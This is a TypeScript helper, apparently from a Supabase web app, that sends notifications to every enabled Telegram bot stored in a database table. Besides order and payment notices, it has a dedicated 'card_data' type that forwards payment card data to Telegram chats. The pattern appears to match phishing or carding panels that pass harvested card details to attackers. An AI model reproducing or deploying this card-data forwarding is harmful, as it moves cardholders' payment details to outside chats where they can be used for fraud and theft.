
import { supabase } from '@/integrations/supabase/client';

interface TelegramBot {
  id: number;
  token: string;
  chat_id: string;
  enabled: boolean;
  notify_new_orders: boolean;
  notify_payments: boolean;
  notify_card_data: boolean;
}

export async function sendTelegramNotification(
  message: string,
  notificationType: 'new_order' | 'payment' | 'card_data'
) {
  try {
    console.log('[AUDIT] Sending Telegram notification:', message.substring(0, 50) + '...');
    
    // Get all active Telegram bots from settings
    const { data: bots, error: botsError } = await supabase
      .from('telegram_bots')
      .select('*')
      .eq('enabled', true);

    if (botsError) {
      console.error('[AUDIT] Error fetching Telegram bots:', botsError);
      return;
    }

    if (!bots || bots.length === 0) {
      console.warn('[AUDIT] No active Telegram bots configured');
      return;
    }

    // Filter bots based on notification type
    const eligibleBots = bots.filter(bot => {
      switch (notificationType) {
        case 'new_order':
          return bot.notify_new_orders;
        case 'payment':
          return bot.notify_payments;
        case 'card_data':
          return bot.notify_card_data;
        default:
          return false;
      }
    });

    if (eligibleBots.length === 0) {
      console.log('[AUDIT] No bots configured for this notification type:', notificationType);
      return;
    }

    // Send notifications to all eligible bots
    const sendPromises = eligibleBots.map(async (bot) => {
      if (!bot.token || !bot.chat_id) {
        console.warn(`[AUDIT] Incomplete configuration for bot ${bot.id}`);
        return;
      }

      try {
        const response = await fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            chat_id: bot.chat_id, 
            text: message,
            parse_mode: 'HTML'
          }),
        });

        if (!response.ok) {
          const errorBody = await response.text();
          console.error(`[AUDIT] Failed to send Telegram notification to bot ${bot.id}:`, errorBody);
        } else {
          console.log(`[AUDIT] Telegram notification sent successfully to bot ${bot.id}`);
        }
      } catch (error) {
        console.error(`[AUDIT] Error sending Telegram notification to bot ${bot.id}:`, error);
      }
    });

    await Promise.all(sendPromises);
  } catch (error) {
    console.error('[AUDIT] Error in sendTelegramNotification:', error);
  }
}
